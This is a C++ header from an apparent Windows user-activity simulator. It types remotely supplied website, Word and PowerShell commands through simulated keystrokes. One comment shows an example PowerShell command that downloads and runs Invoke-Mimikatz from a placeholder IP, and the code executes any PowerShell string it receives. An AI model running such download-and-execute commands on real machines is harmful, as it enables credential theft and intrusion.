#pragma once // means header files are only compiled once... (dont delete this line again..)

#include <string>

#include "KeyboardUtils.h"
#include "KeyCodes.h"
#include "Settings.h"


using namespace KeyboardUtils;

namespace ExecuteCommands
{
    // All Execute functions
    void ExecuteWebsite(std::string site, std::string viewTimeS)
    {
        int viewTime = std::stoi(viewTimeS.c_str());

        // Check for already running process, else create one
        if(GetProcessIdByNameW("firefox.exe")) TabToProcess("Firefox", "firefox.exe");
        else {
            WindowsSearch("firefox");
        }

        CtrlKey('L');
        Sleep(2000);
        KeyboardTyping(site);
        PressEnter();
        Sleep(viewTime);
        std::cout << "\nFinished Viewing \n";

    }
    void ExecuteWord(std::string text)
    {
        std::cout << "msword bro" << std::endl;
        WindowsSearch("word");
        Sleep(1000);
        KeyboardTyping("winword");
        PressEnter();
        Sleep(LOADTIME);
        PressEnter();
        KeyboardTyping(text);
        PressEnter();
    }
    void ExecuteBrowse(std::string site)
    {
        srand(time(0));

        // Check for already running process, else create one
        if (GetProcessIdByNameW("firefox.exe")) TabToProcess("Firefox", "firefox.exe");
        else {
            WindowsSearch("firefox");
        }

        Sleep(5000);
        CtrlKey('L');
        Sleep(2000);
        KeyboardTyping(site);
        PressEnter();
        Sleep(500);

        // Make sure mouse is set over the window (using middle of the screen)
        int nX = (horizontal / 2) * 65535 / GetSystemMetrics(SM_CXSCREEN);
        int nY = (vertical / 2) * 65535 / GetSystemMetrics(SM_CYSCREEN);
        mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, nX, nY, 0, 0);
        mouse_event(MOUSEEVENTF_WHEEL, 0, 0, 1 * 120, 0);

        ArrowScroll();
        Sleep(5000);
        ArrowScroll();
        Sleep(10000);
        ArrowScroll();

    }
    void ExecutePS(std::string psCmd)
    {
        std::cout << "powershell bro" << std::endl;
        // Check for already running process, else create one

        WindowsSearch("Powershell"); // Keep this for now, debug has Powershell running locally so yeah....
        /*
        if (GetProcessIdByNameW("powershell.exe")) TabToProcess("PowerShell.lnk", "Powershell.exe");
        else {
            WindowsSearch("Powershell");
        }
        */

        Sleep(LOADTIME);
        KeyboardTyping(psCmd);
        PressEnter();
    }

    void ParseCmd(std::string newCmd)
    {
        std::string cmds[4] = {};

        std::string execute = newCmd.substr(2, newCmd.length() - 2);


        std::string s = newCmd;
        std::string delimiter = "~";

        int arrayPos = 0;
        size_t pos = 0;
        std::string cmdPart;
        while ((pos = s.find(delimiter)) != std::string::npos) {
            cmdPart = s.substr(0, pos);
            cmds[arrayPos] = cmdPart;
            s.erase(0, pos + delimiter.length());
            arrayPos++;
        }

        std::cout << "Viewing " << cmds[1] << " " << cmds[2] << std::endl;


        switch (newCmd[0])
        {
            //W~https://www.youtube.com/watch?v=dQw4w9WgXcQ~212000~
            // Website load e.g. YouTube video to watch
        case 'W':
            std::cout << "Recieved a Website request:\n" << cmds[0] << " " << cmds[1] << "\n";
            ExecuteWebsite(cmds[1], cmds[2]);
            break;

            //M~<lots of characters here>
            // Microsoft Word, typing out a lot of stuff
        case 'M':
            std::cout << "Recieved a MS Word request:\n" << execute << "\n";
            ExecuteWord(execute);
            break;

            //B~https://en.wikipedia.org/wiki/LOL
            // Browse website e.g. Load Wikipedia and slowly scroll up or down
        case 'B':
            std::cout << "Recieved a Browse Site request:\n" << execute << "\n";
            ExecuteBrowse(execute);
            break;

            //P~iex(New-Object Net.WebClient).Downloadstd::string('http://1.1.1.1/invoke-mimikatz.ps1')
            // Powershell dodge code execution
        case 'P':
            std::cout << "Recieved a Powershell request:\n" << execute << "\n";
            ExecutePS(execute);
            break;

        }
    }
}